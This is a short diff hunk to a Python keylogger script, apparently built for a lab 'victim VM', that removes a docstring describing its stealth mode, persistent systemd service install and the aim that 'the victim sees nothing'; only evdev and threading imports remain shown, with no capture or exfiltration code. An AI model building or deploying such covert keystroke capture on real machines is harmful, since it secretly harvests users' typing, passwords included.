@@ -1,20 +1,3 @@
-"""
-keylogger_local.py — Autonomous Malware Mode
-=============================================
-Designed to run as a silent, persistent systemd service on the victim VM.
-
-Two operating modes selected at startup:
-  STEALTH  (default)  — zero output, no terminal artefacts, runs invisibly
-  DEBUG               — full verbose output for development and testing
-
-Set mode via environment variable:
-  KEYLOGGER_MODE=debug  sudo -E python3 keylogger_local.py   (debug)
-  sudo python3 keylogger_local.py                             (stealth, default)
-
-When installed as a systemd service (via setup_victim.sh), STEALTH mode
-is always active. The victim sees nothing. No terminal. No output. No trace.
-"""
-
 import evdev
 from evdev import InputDevice, categorize, ecodes
 import threading
